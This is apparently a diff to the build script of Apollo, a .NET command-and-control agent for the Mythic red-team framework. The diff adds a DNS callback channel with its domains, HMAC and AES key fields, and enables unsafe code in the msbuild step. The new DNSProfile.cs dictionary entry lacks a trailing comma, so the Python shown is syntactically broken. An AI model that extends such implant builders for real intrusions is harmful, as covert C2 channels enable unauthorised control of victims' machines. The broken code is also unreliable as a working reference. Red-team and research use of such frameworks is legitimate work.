@@ -26,7 +26,7 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
         "output_type": BuildParameter(name="output_type", parameter_type=BuildParameterType.ChooseOne, choices=[ "WinExe", "Shellcode", "DLL"], default_value="WinExe", description="Output as shellcode, executable, or dynamically loaded library."),
         "configuration": BuildParameter(name="configuration", parameter_type=BuildParameterType.ChooseOne, choices=["Release"], default_value="Release", description="Build a payload with or without debugging symbols.")
     }
-    c2_profiles = ["http", "SMBServer"]
+    c2_profiles = ["http", "SMBServer","dns"]
     support_browser_scripts = [
         BrowserScript(script_name="copy_additional_info_to_clipboard", author="@djhohnstein"),
         BrowserScript(script_name="create_table", author="@djhohnstein"),
@@ -45,6 +45,17 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
         resp = BuildResponse(status=BuildStatus.Error)
         defines_commands_upper = [f"#define {x.upper()}" for x in self.commands.get_commands()]
         special_files_map = {
+            "DNSProfile.cs": {
+                "callback_interval": "",
+                "callback_jitter": "",
+                "callback_domains": "",
+                "msginit": "",
+                "msgdefault": "",
+                "hmac_key": "",
+                "encrypted_exchange_check": "",
+                "UUID_HERE": self.uuid,
+                "AESPSK": "",
+            }
             "DefaultProfile.cs": {
                 "callback_interval": "",
                 "callback_jitter": "",
@@ -92,6 +103,14 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
                     special_files_map["SMBServerProfile.cs"][key] = val
             elif profile["name"] == "SMBClient":
                 pass
+            elif profile["name"] == "dns":
+                for key, val in c2.get_parameters_dict().items():
+                    if isinstance(val, dict):
+                        special_files_map["DNSProfile.cs"][key] = val["enc_key"] if val["enc_key"] is not None else ""
+                    elif not isinstance(val, str):
+                        special_files_map["DNSProfile.cs"][key] = json.dumps(val)
+                    else:
+                        special_files_map["DNSProfile.cs"][key] = val            
             else:
                 raise Exception("Unsupported C2 profile type for Apollo: {}".format(profile["name"]))
         # create the payload
@@ -119,7 +138,7 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
             elif self.get_parameter('output_type') == "DLL":
                 outputType = "library"
                 file_ext = "dll"
-            command = "nuget restore ; msbuild -p:TargetFrameworkVersion=v{} -p:OutputType=\"{}\" -p:Configuration=\"{}\" -p:Platform=\"{}\"".format(
+            command = "nuget restore ; msbuild /p:AllowUnsafeBlocks=true -p:TargetFrameworkVersion=v{} -p:OutputType=\"{}\" -p:Configuration=\"{}\" -p:Platform=\"{}\"".format(
                 self.get_parameter('version'),
                 outputType,
                 self.get_parameter('configuration'),
